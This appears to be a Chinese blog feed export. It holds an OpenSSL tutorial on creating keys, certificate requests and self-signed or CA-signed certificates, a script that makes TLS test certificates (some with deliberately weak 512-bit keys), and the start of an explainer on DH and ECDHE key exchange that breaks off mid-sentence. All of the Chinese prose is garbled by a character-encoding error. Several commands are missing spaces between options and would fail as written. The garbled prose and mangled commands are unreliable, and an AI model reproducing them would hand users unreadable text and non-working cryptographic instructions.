æ˜¾ç¤ºæ ¼å¼txtã€ç”¨äºæŸ¥çœ‹è¯ä¹¦ã€ç§é’¥ä¿¡æ¯ã€‘    -text</code></pre><p>ä½¿ç”¨çš„æ¡ˆä¾‹ï¼šåˆ©ç”¨ç§é’¥ç”Ÿæˆè¯ä¹¦è¯·æ±‚csr</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl req -new -key server.key -out server.csr</code></pre><p>ä½¿ç”¨æ¡ˆä¾‹ï¼šåˆ©ç”¨ç§é’¥ç”Ÿæˆè‡ªç­¾åè¯ä¹¦</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl req -new -x509 -days <span class="token number">3650</span> -key ca.key -out ca.crt</code></pre></div><h2 id="ç”Ÿæˆç§é’¥">ç”Ÿæˆç§é’¥</h2><div class="story post-story"><p><strong>genrsa genkey</strong>è¿™ä¸¤ç§æ–¹æ³•éƒ½åˆ›å»ºRSAå¯†é’¥ï¼Œå°½ç®¡æ ¼å¼ä¸åŒã€‚genrsaè¾“å‡ºpkcs# 1æ ¼å¼çš„RSAå¯†é’¥ï¼Œè€Œgenpkeyè¾“å‡ºä¸€ä¸ªæ›´é€šç”¨çš„å®¹å™¨ï¼Œå¯ä»¥ç®¡ç†ä¸åŒç±»å‹çš„å¯†é’¥ï¼ˆRSAã€DSAã€DHã€ECç­‰ï¼‰</p><h3 id="genrsa-2">genrsa</h3><pre class="language-bash" data-language="bash"><code class="language-bash">openssl genrsa <span class="token punctuation">[</span>args<span class="token punctuation">]</span> <span class="token punctuation">[</span>numbits<span class="token punctuation">]</span> args1 å¯¹ç”Ÿæˆçš„ç§é’¥æ–‡ä»¶æ˜¯å¦è¦ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡Œå¯¹ç§°åŠ å¯†:     -des <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„DESåŠ å¯†     -des3 <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„3DESåŠ å¯†     -aes128 <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„AES128åŠ å¯†     -aes192 <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„AES192åŠ å¯†     -aes256 <span class="token builtin class-name">:</span> CBCæ¨¡å¼çš„AES256åŠ å¯† args2 å¯¹ç§°åŠ å¯†å¯†ç     -passout passwords    å…¶ä¸­passwordsä¸ºå¯¹ç§°åŠ å¯†<span class="token punctuation">(</span>desã€3desã€aes<span class="token punctuation">)</span>çš„å¯†ç <span class="token punctuation">(</span>ä½¿ç”¨è¿™ä¸ªå‚æ•°å°±çœå»äº†consoleäº¤äº’æç¤ºè¾“å…¥å¯†ç çš„ç¯èŠ‚<span class="token punctuation">)</span> args3 è¾“å‡ºæ–‡ä»¶    -out <span class="token function">file</span> <span class="token builtin class-name">:</span> è¾“å‡ºè¯ä¹¦ç§é’¥æ–‡ä»¶ <span class="token punctuation">[</span>numbits<span class="token punctuation">]</span>: å¯†é’¥é•¿åº¦ï¼Œç†è§£ä¸ºç§é’¥é•¿åº¦ Usage: genrsa <span class="token punctuation">[</span>options<span class="token punctuation">]</span>Valid options are: -help               Display this summary -3                  Use <span class="token number">3</span> <span class="token keyword">for</span> the E value -F4                 Use F4 <span class="token punctuation">(</span>0x10001<span class="token punctuation">)</span> <span class="token keyword">for</span> the E value -f4                 Use F4 <span class="token punctuation">(</span>0x10001<span class="token punctuation">)</span> <span class="token keyword">for</span> the E value -out outfile        Output the key to specified <span class="token function">file</span> -rand val           Load the file<span class="token punctuation">(</span>s<span class="token punctuation">)</span> into the random number generator -writerand outfile  Write random data to the specified <span class="token function">file</span> -passout val        Output <span class="token function">file</span> pass phrase <span class="token builtin class-name">source</span> -*                  Encrypt the output with any supported cipher -engine val         Use engine, possibly a hardware device -primes +int        Specify number of primes</code></pre><p>ä¾‹å¦‚ç”Ÿæˆä¸€ä¸ª2048ä½çš„RSAç§é’¥ï¼Œå¹¶ç”¨des3åŠ å¯†(å¯†ç ä¸º123456)ï¼Œä¿å­˜ä¸º<code>rsa_private_key.pem</code>æ–‡ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl genrsa -des3 -passout pass:123456 -out rsa_private_key.pem  <span class="token number">2048</span>// -des3 æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°args1ï¼›  // -passout pass:123456 æ˜¯ç¬¬äºŒä¸ªå‚æ•°å†™æ³• args2// -out server.key ç¬¬ä¸‰ä¸ªå‚æ•°args3ï¼›   // <span class="token number">2048</span> æœ€åä¸€ä¸ª<span class="token punctuation">[</span>numbits<span class="token punctuation">]</span>å‚æ•°</code></pre><p>ç§é’¥è½¬â¾®åŠ å¯†</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl rsa -in rsa_private_key.pem -passin pass:123456 -out rsa_private.key</code></pre><p>ç§é’¥è½¬åŠ å¯†</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl rsa -in rsa_private.key -aes256 -passout pass:111111 -out rsa_aes_private.key</code></pre><p>ç§é’¥PEMè½¬DER</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl rsa -in rsa_private.key -outform der-out rsa_aes_private.der</code></pre></div><h2 id="genkey">genkey</h2><div class="story post-story"><p>genpkeyå‘½ä»¤ç”¨äºäº§ç”Ÿå„ç§å¯†é’¥ï¼ˆRSAã€DSAã€DHã€ECç­‰ï¼‰çš„ç§é’¥</p><pre class="language-bash" data-language="bash"><code class="language-bash">Usage: genpkey <span class="token punctuation">[</span>options<span class="token punctuation">]</span>Valid options are: -help              Display this summary -out outfile       Output <span class="token function">file</span> -outform PEM<span class="token operator">|</span>DER   output <span class="token function">format</span> <span class="token punctuation">(</span>DER or PEM<span class="token punctuation">)</span> -pass val          Output <span class="token function">file</span> pass phrase <span class="token builtin class-name">source</span> -paramfile infile  Parameters <span class="token function">file</span> -algorithm val     The public key algorithm -pkeyopt val       Set the public key algorithm option as opt:value -genparam          Generate parameters, not key -text              Print the <span class="token keyword">in</span> text -*                 Cipher to use to encrypt the key -engine val        Use engine, possibly a hardware deviceOrder of options may be important<span class="token operator">!</span>  See the documentation.</code></pre><p>ç”ŸæˆDSAç®—æ³•çš„ç§é’¥</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl genpkey -genparam -algorithm DSA -out dsap2048.pem -pkeyopt dsa_paramgen_bits:2048</code></pre><p>ç”ŸæˆRSAç®—æ³•çš„ç§é’¥</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl genpkey -algorithm RSA -out rsa2048_key.pem -pkeyopt rsa_keygen_bits:2048</code></pre></div><h2 id="ç”Ÿæˆå…¬é’¥">ç”Ÿæˆå…¬é’¥</h2><div class="story post-story"><pre class="language-bash" data-language="bash"><code class="language-bash">Usage: rsa <span class="token punctuation">[</span>options<span class="token punctuation">]</span>Valid options are: -help              Display this summary -inform <span class="token function">format</span>     Input format, one of DER PEM -outform <span class="token function">format</span>    Output format, one of DER PEM PVK -in val            Input <span class="token function">file</span> -out outfile       Output <span class="token function">file</span> -pubin             Expect a public key <span class="token keyword">in</span> input <span class="token function">file</span> -pubout            Output a public key -passout val       Output <span class="token function">file</span> pass phrase <span class="token builtin class-name">source</span> -passin val        Input <span class="token function">file</span> pass phrase <span class="token builtin class-name">source</span> -RSAPublicKey_in   Input is an RSAPublicKey -RSAPublicKey_out  Output is an RSAPublicKey -noout             Don<span class="token string">'t print key out -text              Print the key in text -modulus           Print the RSA key modulus -check             Verify key consistency -*                 Any supported cipher -pvk-strong        Enable '</span>Strong<span class="token string">' PVK encoding level (default) -pvk-weak          Enable '</span>Weak<span class="token string">' PVK encoding level -pvk-none          Don'</span>t enforce PVK encoding -engine val        Use engine, possibly a hardware device</code></pre><p>å…¬é’¥ç”±ç§é’¥è¿ç®—ç”Ÿæˆ</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem</code></pre></div><h2 id="ç”Ÿæˆâ¾ƒç­¾åè¯ä¹¦">ç”Ÿæˆâ¾ƒç­¾åè¯ä¹¦</h2><div class="story post-story"><p><strong>â½£æˆ RSA ç§é’¥å’Œâ¾ƒç­¾åè¯ä¹¦</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl req -newkey rsa:2048-nodes -keyout rsa_private.key -x509 -days <span class="token number">365</span>-out cert.crt<span class="token comment"># reqæ˜¯è¯ä¹¦è¯·æ±‚çš„â¼¦å‘½ä»¤ï¼Œ</span><span class="token comment"># -newkey rsa:2048 -keyout private_key.pem è¡¨â½°â½£æˆç§é’¥(PKCS8æ ¼å¼)ï¼Œ</span><span class="token comment"># -nodes è¡¨â½°ç§é’¥ä¸åŠ å¯†ï¼Œè‹¥ä¸å¸¦å‚æ•°å°†æâ½°è¾“â¼Šå¯†ç ï¼›</span><span class="token comment"># -x509è¡¨â½°è¾“å‡ºè¯ä¹¦ï¼Œ</span><span class="token comment"># -days365 ä¸ºæœ‰æ•ˆæœŸï¼Œæ­¤åæ ¹æ®æâ½°è¾“â¼Šè¯ä¹¦æ‹¥æœ‰è€…ä¿¡æ¯ï¼›</span><span class="token comment"># è‹¥æ‰§â¾â¾ƒåŠ¨è¾“â¼Šï¼Œå¯ä½¿â½¤-subjé€‰é¡¹ï¼š</span>openssl req -newkey rsa:2048-nodes -keyout rsa_private.key -x509 -days <span class="token number">365</span>-out cert.crt -subj <span class="token string">"/C=CN/ST=GD/L=SZ/O=vihoo/OU=dev/CN=vivo.com/emailAddress=yy@vivo.com"</span></code></pre><p><strong>ä½¿â½¤å·²æœ‰RSA ç§é’¥â½£æˆâ¾ƒç­¾åè¯ä¹¦</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl req -key rsa_private.key -new -x509 -days <span class="token number">365</span>  -out cert.crt<span class="token comment"># -new æŒ‡â½£æˆè¯ä¹¦è¯·æ±‚ åŠ ä¸Š-x509 è¡¨â½°ç›´æ¥è¾“å‡ºè¯ä¹¦</span><span class="token comment"># -key æŒ‡å®šç§é’¥â½‚ä»¶ï¼Œå…¶ä½™é€‰é¡¹ä¸ä¸Šè¿°å‘½ä»¤ç›¸åŒ</span></code></pre><p><strong>â½£æˆç­¾åè¯·æ±‚åŠCA ç­¾å</strong></p><p>ä½¿â½¤ RSAç§é’¥â½£æˆ CSR ç­¾åè¯·æ±‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl genrsa -aes256 -passout pass:111111 -out server.key <span class="token number">2048</span>openssl req -new -key server.key -out server.csr</code></pre><p>æ­¤åè¾“â¼Šå¯†ç ã€serverè¯ä¹¦ä¿¡æ¯å®Œæˆï¼Œä¹Ÿå¯ä»¥å‘½ä»¤â¾æŒ‡å®šå„ç±»å‚æ•°</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl req -new-key server.key -passin pass:111111-out server.csr -subj <span class="token string">"/C=CN/ST=GD/L=SZ/O=vihoo/OU=dev/CN=vivo.com/emailAddress=yy@vivo.com"</span></code></pre><p>æ­¤æ—¶â½£æˆçš„ csrç­¾åè¯·æ±‚â½‚ä»¶å¯æäº¤â¾„ CAè¿›â¾ç­¾å‘</p><p><strong>ä½¿â½¤ CA è¯ä¹¦åŠCAå¯†é’¥ å¯¹è¯·æ±‚ç­¾å‘è¯ä¹¦è¿›â¾ç­¾å‘ï¼Œâ½£æˆ x509è¯ä¹¦</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl x509 -req -days <span class="token number">3650</span>-in server.csr -CA ca.crt -CAkey ca.key -passin pass:111111-CAcreateserial -out server.crt</code></pre><p>å…¶ä¸­ CAxxx é€‰é¡¹â½¤äºæŒ‡å®šCA å‚æ•°è¾“â¼Š</p></div><h2 id="s-client-ä¸-s-server-ç›¸äº’é€šä¿¡">s_client ä¸ s_server ç›¸äº’é€šä¿¡</h2><div class="story post-story"><p><strong>TODO:</strong></p><h1>Code</h1><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># ç”ŸæˆDESç®—æ³•ç§é’¥ å¹¶ç”Ÿæˆè‡ªç­¾åè¯ä¹¦</span><span class="token keyword">for</span> <span class="token for-or-select variable">len</span> <span class="token keyword">in</span> <span class="token number">512</span> <span class="token number">1024</span> <span class="token number">2048</span> <span class="token number">3072</span><span class="token keyword">do</span>  openssl genpkey -genparam -algorithm DSA -out dsap<span class="token variable">$&#123;len&#125;</span>.pem -pkeyopt dsa_paramgen_bits:<span class="token variable">$&#123;len&#125;</span>  openssl genpkey -paramfile dsap<span class="token variable">$&#123;len&#125;</span>.pem -out dsa<span class="token variable">$&#123;len&#125;</span>_key.pem  openssl req -key dsa<span class="token variable">$&#123;len&#125;</span>_key.pem -new -x509 -days <span class="token number">2000</span> -out dsa<span class="token variable">$&#123;len&#125;</span>_cert.pem -subj <span class="token string">"/CN=tls-attacker.com"</span><span class="token keyword">done</span><span class="token comment"># ç”ŸæˆRSAç®—æ³•ç§é’¥ å¹¶ç”Ÿæˆè‡ªç­¾åè¯ä¹¦</span><span class="token keyword">for</span> <span class="token for-or-select variable">len</span> <span class="token keyword">in</span> <span class="token number">512</span> <span class="token number">1024</span> <span class="token number">2048</span> <span class="token number">4096</span><span class="token keyword">do</span>  openssl genpkey -algorithm RSA -out rsa<span class="token variable">$&#123;len&#125;</span>_key.pem -pkeyopt rsa_keygen_bits:<span class="token variable">$&#123;len&#125;</span>   openssl req -key rsa<span class="token variable">$&#123;len&#125;</span>_key.pem -new -x509 -days <span class="token number">2000</span> -out rsa<span class="token variable">$&#123;len&#125;</span>_cert.pem -subj <span class="token string">"/CN=tls-attacker.com"</span><span class="token keyword">done</span><span class="token comment"># ç”ŸæˆECæ¤­åœ†ç®—æ³•çš„ç§é’¥  å¹¶ç”Ÿæˆè‡ªç­¾åè¯ä¹¦</span><span class="token keyword">for</span> <span class="token for-or-select variable">named_curve</span> <span class="token keyword">in</span> secp160k1 secp160r1 secp160r2 secp192k1 secp224k1 secp224r1 secp256k1 secp384r1 secp521r1 sect163k1 sect163r1 sect163r2 sect193r1 sect193r2 sect233k1 sect233r1 sect239k1 sect283k1 sect283r1 sect409k1 sect409r1 sect571k1 sect571r1<span class="token keyword">do</span>  openssl ecparam -name <span class="token variable">$&#123;named_curve&#125;</span> -genkey -out ec_<span class="token variable">$&#123;named_curve&#125;</span>_key.pem  openssl req -key ec_<span class="token variable">$&#123;named_curve&#125;</span>_key.pem -new -x509 -days <span class="token number">2000</span> -out ec_<span class="token variable">$&#123;named_curve&#125;</span>_cert.pem -subj <span class="token string">"/CN=tls-attacker.com"</span><span class="token keyword">done</span><span class="token comment">#</span>openssl req -x509 -new -nodes -extensions v3_ca -key rsa2048_key.pem -days <span class="token number">2000</span> -out rsa_ca.pem -sha256 -subj <span class="token string">"/CN=TLS-Attacker CA"</span>openssl req -x509 -new -nodes -extensions v3_ca -key dsa1024_key.pem -days <span class="token number">2000</span> -out dsa_ca.pem -sha256 -subj <span class="token string">"/CN=TLS-Attacker CA"</span><span class="token comment"># ç”Ÿæˆ dhå‚æ•° dhparam.pem</span>openssl dhparam -out dhparam.pem <span class="token number">1024</span><span class="token comment"># æ ¹æ®dhå‚æ•° ç”Ÿæˆ dhç§é’¥</span>openssl genpkey -paramfile dhparam.pem -out dhkey.pem<span class="token comment"># pkeyå‘½ä»¤ç”¨äºå¤„ç†å…¬é’¥æˆ–ç§é’¥ï¼Œ</span><span class="token comment"># æ ¹æ®dhç§é’¥ç”Ÿæˆdhå…¬é’¥</span>openssl pkey -in dhkey.pem -pubout -out dhpubkey.pem<span class="token comment"># ä½¿ç”¨ rsa2048_key.pem ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ rsa.csr</span>openssl req -new -key rsa2048_key.pem -out rsa.csr -subj <span class="token string">"/CN=tls-attacker.com"</span>openssl x509 -req -in rsa.csr -CAkey rsa2048_key.pem -CA rsa_ca.pem -force_pubkey dhpubkey.pem -outrsa_dhcert.pem -CAcreateserialopenssl req -new -key dsa1024_key.pem -out dsa.csr -subj <span class="token string">"/CN=tls-attacker.com"</span>openssl x509 -req -in dsa.csr -CAkey dsa1024_key.pem -CA dsa_ca.pem -force_pubkey dhpubkey.pem -out dsa_dhcert.pem -CAcreateserial<span class="token keyword">for</span> <span class="token for-or-select variable">named_curve</span> <span class="token keyword">in</span> secp160k1 secp160r1 secp160r2 secp192k1 secp224k1 secp224r1 secp256k1 secp384r1 secp521r1 sect163k1 sect163r1 sect163r2 sect193r1 sect193r2 sect233k1 sect233r1 sect239k1 sect283k1 sect283r1 sect409k1 sect409r1 sect571k1 sect571r1<span class="token keyword">do</span>  openssl ecparam -out ec_param_<span class="token variable">$&#123;named_curve&#125;</span>.pem -name <span class="token variable">$&#123;named_curve&#125;</span>openssl genpkey -paramfile ec_param_<span class="token variable">$&#123;named_curve&#125;</span>.pem -out ec_rsa_private_key_<span class="token variable">$&#123;named_curve&#125;</span>.pem  openssl pkey -in ec_rsa_private_key_<span class="token variable">$&#123;named_curve&#125;</span>.pem -pubout -out ec_rsa_public_key_<span class="token variable">$&#123;named_curve&#125;</span>.pemopenssl x509 -req -in rsa.csr -CAkey rsa2048_key.pem -CA rsa_ca.pem -force_pubkey ec_rsa_public_key_<span class="token variable">$&#123;named_curve&#125;</span>.pem -out ec_rsa_cert_<span class="token variable">$&#123;named_curve&#125;</span>.pem -CAcreateserial<span class="token keyword">done</span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> SSL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›¾è§£ECDHEå¯†é’¥äº¤æ¢ç®—æ³•</title>
      <link href="/posts/1bc7b49d/"/>
      <url>/posts/1bc7b49d/</url>
      
        <content type="html"><![CDATA[<h1>å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•</h1><p>HTTPS å¸¸ç”¨çš„<a href="https://so.csdn.net/so/search?q=%E5%AF%86%E9%92%A5&amp;spm=1001.2101.3001.7020">å¯†é’¥</a>äº¤æ¢ç®—æ³•æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯ RSA å’Œ ECDHE ç®—æ³•ã€‚</p><p>å…¶ä¸­ï¼Œ<a href="https://so.csdn.net/so/search?q=RSA&amp;spm=1001.2101.3001.7020">RSA</a> æ˜¯æ¯”è¾ƒä¼ ç»Ÿçš„å¯†é’¥äº¤æ¢ç®—æ³•ï¼Œå®ƒä¸å…·å¤‡å‰å‘å®‰å…¨çš„æ€§è´¨ï¼Œå› æ­¤ç°åœ¨å¾ˆå°‘æœåŠ¡å™¨ä½¿ç”¨çš„ã€‚è€Œ ECDHE ç®—æ³•å…·æœ‰å‰å‘å®‰å…¨ï¼Œæ‰€ä»¥è¢«å¹¿æ³›ä½¿ç”¨ã€‚</p><p>ä»Šå¤©è¿™ä¸€ç¯‡ã€Œä»ç†è®ºå†åˆ°å®æˆ˜<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&amp;spm=1001.2101.3001.7020">æŠ“åŒ…</a>ã€ä»‹ç» <strong>ECDHE ç®—æ³•</strong>ã€‚</p><p><img src="https://s2.loli.net/2022/07/18/cTvLdmuFAtOY1wi.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/cTvLdmuFAtOY1wi.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><hr><h2 id="ç¦»æ•£å¯¹æ•°">ç¦»æ•£å¯¹æ•°</h2><div class="story post-story"><p>ECDHE å¯†é’¥åå•†ç®—æ³•æ˜¯ DH ç®—æ³•æ¼”è¿›è¿‡æ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä» DH ç®—æ³•è¯´èµ·ã€‚</p><p>DH ç®—æ³•æ˜¯<a href="https://so.csdn.net/so/search?q=%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86&amp;spm=1001.2101.3001.7020">éå¯¹ç§°åŠ å¯†</a>ç®—æ³•ï¼Œ å› æ­¤å®ƒå¯ä»¥ç”¨äºå¯†é’¥äº¤æ¢ï¼Œè¯¥ç®—æ³•çš„æ ¸å¿ƒæ•°å­¦æ€æƒ³æ˜¯<strong>ç¦»æ•£å¯¹æ•°</strong>ã€‚</p><p>æ˜¯ä¸æ˜¯å¬åˆ°è¿™ä¸ªæ•°å­¦æ¦‚å¿µå°±æ€‚äº†ï¼Ÿä¸æ€•ï¼Œè¿™æ¬¡ä¸ä¼šè¯´ç¦»æ•£å¯¹æ•°æ¨åˆ°çš„è¿‡ç¨‹ï¼Œåªç®€å•æä¸€ä¸‹å®ƒçš„æ•°å­¦å…¬å¼ã€‚</p><p>ç¦»æ•£å¯¹æ•°æ˜¯ã€Œç¦»æ•£ + å¯¹æ•°ã€çš„ä¸¤ä¸ªæ•°å­¦æ¦‚å¿µçš„ç»„åˆï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥å¤ä¹ ä¸€éå¯¹æ•°ã€‚</p><p>è¦è¯´èµ·å¯¹æ•°ï¼Œå¿…ç„¶è¦è¯´æŒ‡æ•°ï¼Œå› ä¸ºå®ƒä»¬æ˜¯äº’ä¸ºåå‡½æ•°ï¼ŒæŒ‡æ•°å°±æ˜¯å¹‚è¿ç®—ï¼Œå¯¹æ•°æ˜¯æŒ‡æ•°çš„é€†è¿ç®—ã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼Œå¦‚æœä»¥ 2 ä½œä¸ºåº•æ•°ï¼Œé‚£ä¹ˆæŒ‡æ•°å’Œå¯¹æ•°è¿ç®—å…¬å¼ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/18/NgoxW9vHcw5ezUi.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/NgoxW9vHcw5ezUi.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>é‚£ä¹ˆå¯¹äºåº•æ•°ä¸º 2 çš„æ—¶å€™ï¼Œ 32 çš„å¯¹æ•°æ˜¯ 5ï¼Œ64 çš„å¯¹æ•°æ˜¯ 6ï¼Œè®¡ç®—è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/07/18/NCkIacgMqx43meK.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/NCkIacgMqx43meK.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>å¯¹æ•°è¿ç®—çš„å–å€¼æ˜¯å¯ä»¥è¿ç»­çš„ï¼Œè€Œç¦»æ•£å¯¹æ•°çš„å–å€¼æ˜¯ä¸èƒ½è¿ç»­çš„ï¼Œå› æ­¤ä¹Ÿä»¥ã€Œç¦»æ•£ã€å¾—åï¼Œ</p><p>ç¦»æ•£å¯¹æ•°æ˜¯åœ¨å¯¹æ•°è¿ç®—çš„åŸºç¡€ä¸ŠåŠ äº†ã€Œæ¨¡è¿ç®—ã€ï¼Œä¹Ÿå°±è¯´å–ä½™æ•°ï¼Œå¯¹åº”ç¼–ç¨‹è¯­è¨€çš„æ“ä½œç¬¦æ˜¯ã€Œ%ã€ï¼Œä¹Ÿå¯ä»¥ç”¨ mod è¡¨ç¤ºã€‚ç¦»æ•£å¯¹æ•°çš„æ¦‚å¿µå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://s2.loli.net/2022/07/18/OZxENY6JpcmnqCb.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/OZxENY6JpcmnqCb.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>ä¸Šå›¾çš„ï¼Œåº•æ•° a å’Œæ¨¡æ•° p æ˜¯ç¦»æ•£å¯¹æ•°çš„å…¬å…±å‚æ•°ï¼Œä¹Ÿå°±è¯´æ˜¯å…¬å¼€çš„ï¼Œb æ˜¯çœŸæ•°ï¼Œi æ˜¯å¯¹æ•°ã€‚çŸ¥é“äº†å¯¹æ•°ï¼Œå°±å¯ä»¥ç”¨ä¸Šé¢çš„å…¬å¼è®¡ç®—å‡ºçœŸæ•°ã€‚ä½†åè¿‡æ¥ï¼ŒçŸ¥é“çœŸæ•°å´å¾ˆéš¾æ¨ç®—å‡ºå¯¹æ•°ã€‚</p><p><strong>ç‰¹åˆ«æ˜¯å½“æ¨¡æ•° p æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„è´¨æ•°ï¼Œå³ä½¿çŸ¥é“åº•æ•° a å’ŒçœŸæ•° b ï¼Œåœ¨ç°æœ‰çš„è®¡ç®—æœºçš„è®¡ç®—æ°´å¹³æ˜¯å‡ ä¹æ— æ³•ç®—å‡ºç¦»æ•£å¯¹æ•°çš„ï¼Œè¿™å°±æ˜¯ DH ç®—æ³•çš„æ•°å­¦åŸºç¡€ã€‚</strong></p><hr></div><h2 id="DH-ç®—æ³•">DH ç®—æ³•</h2><div class="story post-story"><p>è®¤è¯†äº†ç¦»æ•£å¯¹æ•°ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ DH ç®—æ³•æ˜¯å¦‚ä½•å¯†é’¥äº¤æ¢çš„ã€‚</p><p>ç°å‡è®¾å°çº¢å’Œå°æ˜çº¦å®šä½¿ç”¨ DH ç®—æ³•æ¥äº¤æ¢å¯†é’¥ï¼Œé‚£ä¹ˆåŸºäºç¦»æ•£å¯¹æ•°ï¼Œå°çº¢å’Œå°æ˜éœ€è¦å…ˆç¡®å®šæ¨¡æ•°å’Œåº•æ•°ä½œä¸ºç®—æ³•çš„å‚æ•°ï¼Œè¿™ä¸¤ä¸ªå‚æ•°æ˜¯å…¬å¼€çš„ï¼Œç”¨ P å’Œ G æ¥ä»£ç§°ã€‚</p><p>ç„¶åå°çº¢å’Œå°æ˜å„è‡ªç”Ÿæˆä¸€ä¸ªéšæœºæ•´æ•°ä½œä¸º<strong>ç§é’¥</strong>ï¼ŒåŒæ–¹çš„ç§é’¥è¦å„è‡ªä¸¥æ ¼ä¿ç®¡ï¼Œä¸èƒ½æ³„æ¼ï¼Œå°çº¢çš„ç§é’¥ç”¨ a ä»£ç§°ï¼Œå°æ˜çš„ç§é’¥ç”¨ b ä»£ç§°ã€‚</p><p>ç°åœ¨å°çº¢å’Œå°æ˜åŒæ–¹éƒ½æœ‰äº† P å’Œ G ä»¥åŠå„è‡ªçš„ç§é’¥ï¼Œäºæ˜¯å°±å¯ä»¥è®¡ç®—å‡º<strong>å…¬é’¥</strong>ï¼š</p><ul><li>å°çº¢çš„å…¬é’¥è®°ä½œ Aï¼ŒA = G ^ a ( mod P )ï¼›</li><li>å°æ˜çš„å…¬é’¥è®°ä½œ Bï¼ŒB = G ^ b ( mod P )ï¼›</li></ul><p>A å’Œ B ä¹Ÿæ˜¯å…¬å¼€çš„ï¼Œå› ä¸ºæ ¹æ®ç¦»æ•£å¯¹æ•°çš„åŸç†ï¼Œä»çœŸæ•°ï¼ˆA å’Œ Bï¼‰åå‘è®¡ç®—å¯¹æ•° a å’Œ b æ˜¯éå¸¸å›°éš¾çš„ï¼Œè‡³å°‘åœ¨ç°æœ‰è®¡ç®—æœºçš„è®¡ç®—èƒ½åŠ›æ˜¯æ— æ³•ç ´è§£çš„ï¼Œå¦‚æœé‡å­è®¡ç®—æœºå‡ºæ¥äº†ï¼Œé‚£å°±æœ‰å¯èƒ½è¢«ç ´è§£ï¼Œå½“ç„¶å¦‚æœé‡å­è®¡ç®—æœºçœŸçš„å‡ºæ¥äº†ï¼Œé‚£ä¹ˆå¯†é’¥åå•†ç®—æ³•å°±è¦åšå¤§çš„å‡çº§äº†ã€‚</p><p>åŒæ–¹äº¤æ¢å„è‡ª DH å…¬é’¥åï¼Œå°çº¢æ‰‹ä¸Šå…±æœ‰ 5 ä¸ªæ•°ï¼šPã€Gã€aã€Aã€Bï¼Œå°æ˜æ‰‹ä¸Šä¹ŸåŒæ ·å…±æœ‰ 5 ä¸ªæ•°ï¼šPã€Gã€bã€Bã€Aã€‚</p><p>ç„¶åå°çº¢æ‰§è¡Œè¿ç®—ï¼š B ^ a ( mod P )ï¼Œå…¶ç»“æœä¸º Kï¼Œå› ä¸ºç¦»æ•£å¯¹æ•°çš„å¹‚è¿ç®—æœ‰äº¤æ¢å¾‹ï¼Œæ‰€ä»¥å°æ˜æ‰§è¡Œè¿ç®—ï¼š A ^ b ( mod P )ï¼Œå¾—åˆ°çš„ç»“æœä¹Ÿæ˜¯ Kã€‚</p><p><img src="https://s2.loli.net/2022/07/18/8XbPepTo65kmnvc.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/8XbPepTo65kmnvc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>è¿™ä¸ª K å°±æ˜¯å°çº¢å’Œå°æ˜ä¹‹é—´ç”¨çš„<strong>å¯¹ç§°åŠ 